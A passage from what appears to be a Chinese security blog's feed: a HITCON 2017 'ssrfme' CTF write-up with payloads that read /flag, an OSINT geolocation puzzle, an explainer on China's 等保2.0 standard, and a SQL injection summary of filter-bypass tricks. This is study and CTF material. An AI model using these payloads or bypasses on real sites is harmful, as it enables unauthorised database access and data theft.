        <content type="html"><![CDATA[<h1 id="hitcon-2017-ssrfme"><a href="#hitcon-2017-ssrfme" class="headerlink" title="hitcon_2017_ssrfme"></a>hitcon_2017_ssrfme</h1><pre><code class="php"> &lt;?php     $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);     @mkdir($sandbox);     @chdir($sandbox);     $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     $info = pathinfo($_GET[&quot;filename&quot;]);     $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));     @mkdir($dir);     @chdir($dir);     @file_put_contents(basename($info[&quot;basename&quot;]), $data);     highlight_file(__FILE__); </code></pre><p>这个代码的意思大概是通过GET方法请求到的数据保存在我们自定义的文件名当中。</p><p>给url参数传递&#x2F;可以查看根目录下的内容</p><pre><code>$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</code></pre><p>访问sandbox&#x2F;+md5(orange+出口Ip)    注意:加密后用小写的</p><p>如果出现下图，说明路径是对的</p><p><img src="https://img-blog.csdnimg.cn/20210502212135484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNjUyODY0,size_16,color_FFFFFF,t_70"></p><p>然后构造payload1:</p><pre><code>?url=/&amp;fliename=aaa</code></pre><p>这个aaa可以随便写，能用就行</p><p>然后访问:</p><pre><code>/sandbox/md5加密后的内容/aaa</code></pre><p>出现以下目录</p><p><img src="https://i.loli.net/2021/10/07/9A3qsJf8m6QoLlp.png">)</p><p>可以看到flag</p><p>然后改一下payload继续以上操作</p><pre><code>?url=/flag&amp;fliename=aaa</code></pre><pre><code>/sandbox/md5加密后的内容/aaa</code></pre><p>发现文件没法显示</p><p><img src="https://i.loli.net/2021/10/07/1d7aiGARerbP4OX.png"></p><p>继续改payload</p><pre><code>?url=/flag&amp;fliename=aaa.txt</code></pre><pre><code>/sandbox/md5加密后的内容/aaa.txt</code></pre><p>flag就出来了</p><p><img src="https://i.loli.net/2021/10/07/7CsKIJzpm6XnLSx.png"></p><h2 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h2><p>“REMOTE_ADDR” ：正在浏览当前页面用户的 IP 地址</p><p>escapeshellarg （）：— 把字符串转码为可以在 shell 命令里使用的参数</p><p>pathinfo()： 函数以数组的形式返回关于文件路径的信息</p><p>basename() 函数返回路径中的文件名部分</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络迷踪</title>
      <link href="/2021/10/04/%E7%BD%91%E7%BB%9C%E8%BF%B7%E8%B8%AA/"/>
      <url>/2021/10/04/%E7%BD%91%E7%BB%9C%E8%BF%B7%E8%B8%AA/</url>
      
        <content type="html"><![CDATA[<h1 id="网络迷踪"><a href="#网络迷踪" class="headerlink" title="网络迷踪"></a>网络迷踪</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>从图中信息找到该麦当劳门店所在位置：</p><p><img src="https://i.loli.net/2021/10/05/YqzwIRnhU9isgZL.jpg"></p><h2 id="图中获取到的信息"><a href="#图中获取到的信息" class="headerlink" title="图中获取到的信息"></a>图中获取到的信息</h2><ol><li><p>这是小票上的信息erbang alaf restaurants，Tesco pe…，jalan SS21&#x2F;39</p><p><img src="https://i.loli.net/2021/10/05/6AaUnSLgKIdc9GW.jpg"></p></li><li><p>麦当劳  McDonald’s</p></li></ol><h2 id="搜索引擎搜索"><a href="#搜索引擎搜索" class="headerlink" title="搜索引擎搜索"></a>搜索引擎搜索</h2><ol><li><p>erbang alaf restaurants</p><p><img src="https://i.loli.net/2021/10/05/8Jhn6EjDePNizAc.png"></p><p>2.搜索gerbang alaf restaurants address ，发现是一家名为Gerbang Alaf Restaurant Sdn Bhd的店，地点锁定在马来西亚</p><p><img src="https://i.loli.net/2021/10/05/XYnLf7pCRBWZhSw.png"></p><p>翻译一下: <strong>Level 6, Bangunan TH, Damansara Uptown 3. No 3, Jalan SS21&#x2F;39, 47400 Petaling Jaya</strong>.得到其详细地址</p><p><img src="https://i.loli.net/2021/10/11/3mceCOgvxU4QXZq.png"></p><p>然后用谷歌地图定位应该就可以了</p></li></ol><p><a href="https://www.icode9.com/content-4-1165067.html">这是网上找到的答案</a></p><p>​</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>等保2.0</title>
      <link href="/2021/10/04/%E7%AD%89%E4%BF%9D2-0/"/>
      <url>/2021/10/04/%E7%AD%89%E4%BF%9D2-0/</url>
      
        <content type="html"><![CDATA[<h1 id="等保2-0"><a href="#等保2-0" class="headerlink" title="等保2.0"></a>等保2.0</h1><h2 id="等保1-0回顾"><a href="#等保1-0回顾" class="headerlink" title="等保1.0回顾"></a>等保1.0回顾</h2><p>在开始讲等保2.0之前，让我们先回顾一下等保1.0。等保1.0发布距今已经有10多年的时间，在这些日子里，网络安全也越来越被人们所重视。</p><p>在1.0的初期，企业只要有安全意识，能开始做等保，开始测评就已经很不错了；到了中期，整体防护，渗透测试，合规开始等于安全。行业等级保护全面开展，等保开始逐渐的深入人心；再到1.0的后期，无论是企业层面还是国家层面，都更注重实质性的安全。主动防御、态势感知、攻防对抗等安全手段开始流行，云安、大数据、工控安全和移动安全开始占领主要趋势。</p><p>等保1.0普及了等保概念，强化了安全意识，从单个系统到部门、到行业，再到上升到国家层面从合规到攻防对抗，整体提升了网络安全保障能力技术并且不断进行人才的积累，这些都对等保2.0提供了有力的支撑。</p><h2 id="等保2-0是什么？"><a href="#等保2-0是什么？" class="headerlink" title="等保2.0是什么？"></a>等保2.0是什么？</h2><p>等保2.0全称网络安全等级保护2.0制度，是我国网络安全领域的基本国策、基本制度。等级保护标准在1.0时代标准的基础上，注重主动防御，从被动防御到事前、事中、事后全流程的安全可信、动态感知和全面审计，实现了对传统信息系统、基础信息网络、云计算、大数据、物联网、移动互联网和工业控制信息系统等级保护对象的全覆盖。</p><h2 id="等保2-0有哪些不变？"><a href="#等保2-0有哪些不变？" class="headerlink" title="等保2.0有哪些不变？"></a>等保2.0有哪些不变？</h2><p>1.五个级别不变</p><p>从第一级到第五级依次是：用户自主保护级、系统审计保护级、安全标记保护级、结构化保护级、访问验证保护级。</p><p><img src="https://img-blog.csdnimg.cn/20200818171120422.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDQ1MjQx,size_16,color_FFFFFF,t_70"></p><p>等级保护五个级别</p><p>2.规定动作不变</p><p>规定动作分别为：定级、备案、建设整改、等级测评、监督检查。</p><p>等级保护规定动作</p><p>3.主体职责不变</p><p>等级保护的主体职责为：网安对定级对象的备案受理及监督检查职责、第三方测评机构对定级对象的安全评估职责、上级主管单位对所属单位的安全管理职责、运营使用单位对定级对象的等级保护职责。</p><h2 id="等保2-0有哪些变化？"><a href="#等保2-0有哪些变化？" class="headerlink" title="等保2.0有哪些变化？"></a>等保2.0有哪些变化？</h2><p>近年来，随着信息技术的发展和网络安全形势的变化，等保1.0要求已无法有效应对新的安全风险和新技术应用所带来的新威胁，等保1.0被动防御为主的防御无法满足当前发展要求，因此急需建立一套主动防御体系。等保2.0适时而出，从法律法规、标准要求、安全体系、实施环节等方面都有了变化。</p><p>1.标准依据的变化</p><p>从条例法规提升到法律层面。等保1.0的最高国家政策是国务院147号令，而等保2.0标准的最高国家政策是网络安全法，其中《中华人民共和国网络安全法》第二十一条要求，国家实施网络安全等级保护制度；第二十五条要求，网络运营者应当制定网络安全事件应急预案；第三十一条则要求，关键基础设施，在网络安全等级保护制度的基础上，实行重点保护；第五十九条规定的网络安全保护义务的，由有关主管部门给予处罚。因此不开展等级保护等于违法。</p><p>2.标准要求变化</p><p>等级2.0在1.0基本上进行了优化，同时对云计算、物联网、移动互联网、工业控制、大数据新技术提出了新的安全扩展要求。在使用新技术的信息系统需要同时满足“通用要求+扩展要求”。且针对新的安全形势提出了新的安全要求，标准覆盖度更加全面，安全防护能力有很大提升。</p><p>通用要求方面，等保2.0标准的核心是优化。删除了过时的测评项，对测评项进行合理改写，新增对新型网络攻击行为防护和个人信息保护等新要求，调整了标准结构、将安全管理中心从管理层面提升至技术层面。</p><p>扩展要求扩展了云计算、物联网、移动互联网、工业控制、大数据。</p><p>3.安全体系变化</p><p>等保2.0相关标准依然采用“一个中心、三重防护”的理念，从等保1.0被动防御的安全体系向事前防御、事中相应、事后审计的动态保障体系转变。建立安全技术体系和安全管理体系，构建具备相应等级安全保护能力的网络安全综合防御体系，开展组织管理、机制建设、安全规划、通报预警、应急处置、态势感知、能力建设、监督检查、技术检测、队伍建设、教育培训和经费保障等工作。</p><p>4.等级规定动作</p><p>保护定级、备案、建设整改、等级测评、监督检查的实施过程中，等保2.0进行了优化和调整。</p><p>（1）定级对象的变化。</p><p>等保1.0定级的对象是信息系统，等保2.0的定级对象扩展至基础信息网络、工业控制系统、云计算平台、物联网、使用移动互联技术的网络、其他网络以及大数据等多个系统平台，覆盖面更广。</p><p>（2）定级级别的变化。</p><p>公民、法人和其他组织的合法权益产生特别严重损害时，相应系统的等级保护级别从1.0的第二级调整到了第三级（根据GA&#x2F;T1389）。</p><p>（3）定级流程的变化。</p><p>等保2.0标准不再自主定级，二级及以上系统定级必须经过专家评审和主管部门审核，才能到公安机关备案，整体定级更加严格。</p><p>（4）测评合格要求提高</p><p>相较于等保1.0，等保2.0测评的标准发生了变化，2.0中测评结论分为：优（90分及以上）、良（80分及以上）、中（70分及以上）、差（低于70分），70分以上才算基本符合要求，基本分调高了，测评要求更加严格。</p><p><img src="https://img-blog.csdnimg.cn/20200818171120511.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDQ1MjQx,size_16,color_FFFFFF,t_70"></p><p>网络安全战略规划目标<br>等保2.0的实施对企业有什么影响？</p><p>根据谁主管谁负责、谁运营谁负责、谁使用谁负责的原则，网络运营者成为等级保护的责任主体，如何快速高效地通过等级保护测评成为企业开展业务前必须思考的问题。</p><p>等保2.0有5个运行步骤：定级、备案、建设和整改、等级测评、检查。同时，也分5个等级，即信息系统按重要程度由低到高分为5个等级，并分别实施不同的保护策略。</p><p><img src="https://img-blog.csdnimg.cn/20200818171120425.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDQ1MjQx,size_16,color_FFFFFF,t_70"></p><p>相关处罚措施有:</p><p>《网络安全法》第五十九条规定：</p><p>网络运营者不履行义务的：由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>关键信息基础设施的运营者不履行义务的 ：由有关主管部门责令改正，给予警告； 拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><p>划重点：用户单位不做等级保护测评，用户单位需要被罚款1万-100万；主管人员需要被罚款5000-100000。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>s q l注入小结</title>
      <link href="/2021/05/26/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/"/>
      <url>/2021/05/26/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="s-q-l-注入的小总结"><a href="#s-q-l-注入的小总结" class="headerlink" title="s q l 注入的小总结"></a>s q l 注入的小总结</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>​就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p><h2 id="s-q-l注入攻击一般流程："><a href="#s-q-l注入攻击一般流程：" class="headerlink" title="s q l注入攻击一般流程："></a>s q l注入攻击一般流程：</h2><h2 id="1-判断注入点："><a href="#1-判断注入点：" class="headerlink" title="1.判断注入点："></a>1.判断注入点：</h2><p>​判断一个链接是否存在注入漏洞，可以通过对其传入的参数（但不仅仅只限于参数，还有cookie注入，HTTP头注入等） 进行构造，然后对服务器返回的内容进行判断来查看是否存在注入点。</p><h2 id="2-判断注入点类型"><a href="#2-判断注入点类型" class="headerlink" title="2.判断注入点类型"></a>2.判断注入点类型</h2><ul><li><p>按照参数类型分类：</p><p>​    (1)数字型注入： 如id&#x3D;1 ，传入的参数是数字，注入时该参数不需要用单或双引号构造闭合。        </p><p>​(2)字符型注入：如username&#x3D;admin  ,传入的参数是字符或字符串，注入时要注意去构造闭合。</p></li><li><p>按照数据请求方式分类:</p><p>​(1)GET注入</p><p>​(2)POST注入</p><p>​(3)HTTP请求头注入</p></li><li><p>按照语句执行效果分类：</p><p>​(1)union联合查询注入</p><p>​(2)报错注入</p><p>​(3)堆叠注入</p><p>​(4)宽字节注入</p><p>​(5)基于布尔的盲注</p><p>​(6)基于时间的盲注</p><p>​(7)二次注入</p><p>​(8)cookie注入 - http请求头参数注入</p><p>​(9)base64注入攻击</p></li></ul><h3 id="3-判断数据库类型"><a href="#3-判断数据库类型" class="headerlink" title="3.判断数据库类型"></a>3.判断数据库类型</h3><ul><li>常见网页类型对应的数据库：</li></ul><table><thead><tr><th>网页类型</th><th>数据库</th></tr></thead><tbody><tr><td>PHP</td><td>MySQL</td></tr><tr><td>asp</td><td>Access&#x2F;SQL server</td></tr><tr><td>.net</td><td>SQL server</td></tr><tr><td>java</td><td>oracle&#x2F;MySQL</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><ul><li>可以通过数据库报错信息来判断数据库类型，例如输入单双引号；</li><li>可用特殊字符或注释判断：<br>1,“null”和“%00”是Access支持的注释。<br>2，“#”是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’– ‘,和&#x2F;* <em>&#x2F;注释（注意mysql使用– 时需要后面添加空格）<br>3，“–”和&#x2F;</em> *&#x2F;是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。<br>4，“;”是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。<br>这样一串下来，基本就知道了数据库类型了</li></ul><h3 id="4-获取数据提权"><a href="#4-获取数据提权" class="headerlink" title="4.获取数据提权"></a>4.获取数据提权</h3><p>这方面鄙人不熟，各位大佬轻喷….</p><h3 id="5-过滤绕过："><a href="#5-过滤绕过：" class="headerlink" title="5.过滤绕过："></a>5.过滤绕过：</h3><p>在实战或ctf中，网站前后端会将用户输入的字符进行过滤，这时就要通过特殊手段绕过过滤。以下是网上文章整合内容</p><h4 id="1-进行fuzz模糊测试："><a href="#1-进行fuzz模糊测试：" class="headerlink" title="(1)进行fuzz模糊测试："></a>(1)进行fuzz模糊测试：</h4><p>输入一些特殊字符或关键字进行测试，这个主要是为了知道数据 库对那些字符或关键字进行了过滤 ，然后对症下药。可以用burpsuite 结合字典来测试。字典部分截图如下，</p><p>​ <img src="/img/sql%E6%B3%A8%E5%85%A5%E5%AD%97%E5%85%B8.png" alt="截图 2020-05-28 172126"></p><h4 id="2-空格被过滤："><a href="#2-空格被过滤：" class="headerlink" title="(2)空格被过滤："></a>(2)空格被过滤：</h4><blockquote><p>1.使用注释符&#x2F; * * &#x2F;，内联注释：&#x2F; * !不带小数点的版本号+关键字*&#x2F;<br>（实战和CTF简单题有些用）<br>2.利用apache的CVE（并且是mysql 5.0版本以上）：<br>%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、<br>%0b TAB键（垂直）、%a0 ，%20空格(这两个有点拉胯)<br>上述的几个字符对付不严格的正则匹配比较有用<br>举例：id&#x3D;-1 union %0A select 1,2,3 from xxx</p><p>用联合查询时（union）用“（）”来代替空格</p><p>如 select(username)from(users)where(id&#x3D;1)</p></blockquote><h4 id="3-引号被过滤："><a href="#3-引号被过滤：" class="headerlink" title="(3)引号被过滤："></a>(3)引号被过滤：</h4><blockquote><p>1.用16进制：0x加上16进制转换后的字符串</p><p>2.未使用addslashes,且注释和反斜杠没有被过滤的情况下：使用单引号转义，构造playload使其拼接成如下语句：</p><pre><code class="sql">select * from user where username=&#39;admin\&#39; and passwd=&#39;123456&#39;;#后面剩下的语句;</code></pre></blockquote><blockquote><ol start="3"><li>在GBK编码条件下使用宽字节注入。</li></ol></blockquote><h4 id="4-等价替换："><a href="#4-等价替换：" class="headerlink" title="(4)等价替换："></a>(4)等价替换：</h4><blockquote><p>and&#x3D;&amp;&amp;&#x3D;%26%26<br>or&#x3D;||&#x3D;%7c%7c<br>xor&#x3D;^</p><p>select在堆叠开启的时候可以用handler代替</p><p>等价函数：<br>ascii()&#x3D;ord()，也可以把这个换成hex,bin,to_base64等等<br>char()&#x3D;chr()<br>mid(xxx,a,b)&#x3D;substring(xxx,a,b)&#x3D;substr(xxx,a,b)<br>还有一个来自我的突发奇想，但是有个缺点就是读到最后会重复返回最后一个字符<br>mid(xxx,a,b)&#x3D;right(left(xxx,a+b),b)<br>strcmp(left(xxx,a),b)，功能类似于like</p><p>where被过滤：<br>from table where id&#x3D;1 等价于<br>from table  a join table b on a(或者b).id&#x3D;1 </p><p>时间盲注中相关函数被过滤可以使用笛卡尔积<br>information_schema.collations,information_schema.collations,information_schema.collations<br>三个collations表做笛卡尔积时间大约为6秒，这个表在一般情况下都是固定的数量，所以对于不同地方的数据库，时间大致都相同。<br>但是注意要在mysql 5以上才可以（只有mysql5以上才有元数据的这个表）<br>这个方法可以直接拿来替换sqlmap掉payloadxml中的sleep(5)，因为sqlmap对time-sec参数的优化是用一种数学方法，所以sleep(5)<br>只是个形式。</p></blockquote><h4 id="5-逗号被过滤："><a href="#5-逗号被过滤：" class="headerlink" title="(5)逗号被过滤："></a>(5)逗号被过滤：</h4><blockquote><p>对于列名</p><pre><code>select 1,2 from xxx = select * from (select 1)a join (select 2)b</code></pre></blockquote><blockquote><p>对于mid(),substr(),substring()这样的三参数字符串截取函数可以使用</p><pre><code>mid(database() from 2 for 1) = mid(database(),2,1)</code></pre></blockquote><blockquote><p>还有一种很常用的使用like或者regexp</p><p>like ‘a%’<br>regexp ‘^a’</p><p>然后逐次增加后面的字母</p></blockquote><blockquote><p>limit的第二个参数用offset绕过</p><pre><code>limit 0,1 = llimit 0 offset 1</code></pre></blockquote><h4 id="6-特殊操作："><a href="#6-特殊操作：" class="headerlink" title="(6)特殊操作："></a>(6)特殊操作：</h4><p>对付正则用双写绕过，如selselectect.</p><p>大小写绕过</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
